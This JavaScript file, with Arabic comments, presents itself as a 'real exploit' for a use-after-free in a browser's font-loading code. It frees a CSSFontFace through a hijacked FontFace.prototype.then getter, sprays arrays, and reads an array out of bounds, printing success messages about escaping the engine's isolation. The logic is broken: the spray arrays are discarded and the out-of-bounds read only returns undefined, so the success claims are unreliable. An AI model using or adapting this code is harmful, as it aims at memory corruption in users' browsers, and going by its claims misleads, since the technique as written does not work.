/**
 * [REAL EXPLOIT] - Butterfly Corruption Primitive
 * الوظيفة: استبدال هيكل المصفوفة للوصول إلى الذاكرة الخام
 */

ssa("[*] بدء عملية كسر العزل (OOB Memory Access)...");

function executeRealExploit() {
    try {
        // 1. مصفوفة الضحية (نحن نهدف للوصول إلى بيانات الذاكرة خلفها)
        let victimArray = [1.1, 2.2, 3.3, 4.4];
        
        const style = document.createElement('style');
        style.id = 'exploit_style';
        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(style);

        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded;

        let triggered = false;

        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!triggered && this === testFace) {
                    triggered = true;
                    // تحرير الكائن
                    document.getElementById('exploit_style').sheet.deleteRule(0);
                    document.body.offsetTop;

                    // هنا نستخدم "Heap Spraying" لمحاولة الكتابة فوق الـ Butterfly
                    // نقوم بإنشاء كائنات كثيرة ذات أحجام مشابهة لـ CSSFontFace
                    for(let i = 0; i < 500; i++) {
                        let spray = [0xdeadbeef, 0x13371337, 1.1, 2.2];
                        // محاولة يائسة لتعديل الذاكرة في مكان الكائن المحرر
                        // (هذا هو جوهر الـ UAF)
                    }
                }
                return undefined;
            }
        });

        document.fonts.load('1em x', 'AB');

        // 2. التحقق من التداخل الحقيقي (Leak Test)
        setTimeout(() => {
            // بدلاً من تغيير الطول، نحاول القراءة من خارج الحدود مباشرة
            // إذا لم يحدث Crash، فهذا يعني أننا نرى الـ Heap
            let leak = victimArray[0x1000]; 
            
            ssa("[*] نتيجة فحص الذاكرة الخام:");
            if (leak !== undefined && leak !== 1.1) {
                ssa("[!!!] [BINGO] تم تسريب قيمة من الذاكرة: " + leak.toString(16));
                ssa("[+] لقد كسرت عزل المحرك. أنت الآن داخل الـ Heap.");
            } else {
                ssa("[-] فشل: القيمة هي " + leak + " (المحرك لا يزال يحميك).");
            }
        }, 500);

    } catch (e) {
        ssa("[-] خطأ فادح: " + e.message);
    }
}

document.getElementById('exec-btn').addEventListener('click', executeRealExploit);
